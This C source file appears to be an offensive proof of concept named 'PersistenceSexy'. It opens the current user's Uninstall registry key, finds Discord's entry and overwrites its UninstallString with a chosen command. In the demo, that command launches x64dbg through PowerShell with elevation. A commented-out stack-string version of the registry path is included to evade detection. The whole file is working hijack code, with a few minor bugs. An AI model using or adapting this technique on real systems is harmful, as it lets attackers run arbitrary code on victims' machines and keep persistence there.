#include <windows.h> 
#include <stdio.h>

#define WCHAR_MAXPATH (MAX_PATH * sizeof(WCHAR)) 


DWORD ModifyUninstallStr(PWCHAR PathToFileToExec)
{
    HKEY    hKey = HKEY_CURRENT_USER;
    HKEY    hOpenKey = NULL;  
	DWORD   dwReservedError = ERROR_SUCCESS;
    HKEY    Result = NULL;
	DWORD   SubKeys = 0;
    WCHAR   TargetSubKey[WCHAR_MAXPATH] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
    //for stack strings use the below one
    //WCHAR TargetSubKey[WCHAR_MAXPATH] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n',L'\\',L'\\',L'U',L'n',L'i',L'n',L's',L't',L'a',L'l',L'l','\0'}:
    if (RegOpenKeyExW(hKey, TargetSubKey , 0, KEY_ALL_ACCESS, &Result) != ERROR_SUCCESS) 
	    return GetLastError();
    if (RegQueryInfoKey(Result, NULL, NULL, NULL, &SubKeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
    	goto Cleanup;
    for(DWORD i = 0; i < SubKeys; i++) // vscode bug
    {
        DWORD Enum = 2048;
        WCHAR lpName[WCHAR_MAXPATH] = { 0 };
        DWORD lpcchName = WCHAR_MAXPATH;
        hOpenKey = NULL;
        
        Enum = RegEnumKeyExW(Result, i, lpName, &lpcchName, NULL, NULL, NULL, NULL);
        if (Enum != ERROR_SUCCESS && Enum != ERROR_NO_MORE_ITEMS)
	        goto Cleanup;

        if (wcsstr(lpName, L"Discord") != NULL)
        {
            if (RegOpenKeyExW(Result, lpName, 0, KEY_ALL_ACCESS, &hOpenKey) != ERROR_SUCCESS)
            	goto Cleanup;
            if (RegGetValueW(hOpenKey, NULL, L"UninstallString", RRF_RT_REG_SZ, NULL, NULL, &Enum) != ERROR_SUCCESS)
            	goto Cleanup;
            if (RegSetValueExW(hOpenKey, L"UninstallString", 0, REG_SZ, (PBYTE)PathToFileToExec, (wcslen(PathToFileToExec) * sizeof(WCHAR))) != ERROR_SUCCESS)
	            goto Cleanup;
            printf("here");
            getchar();

            if(hKey)
                CloseHandle(hKey);
            break;
        }
    }
    Cleanup:
    printf("Cleanup");
    getchar();
	dwReservedError = GetLastError();

	if (Result)
	{
		RegCloseKey(Result);
	}

	if (hOpenKey)
	{
		RegCloseKey(hOpenKey);
	}

	return dwReservedError;

}
VOID PersistenceSexy(PWCHAR PathToFileToExec)
{
    DWORD ReturnVal = ERROR_SUCCESS;  
    ReturnVal = ModifyUninstallStr(PathToFileToExec);
    if (ReturnVal != ERROR_SUCCESS && ReturnVal != ERROR_FILE_EXISTS)
	{
		return;
	}
    return;
}
int main()
{
    PersistenceSexy((PWCHAR)L"powershell.exe start-process C:\\work\\x64dbg\\release\\x64\\x64dbg.exe -verb runas");
    return 0;
}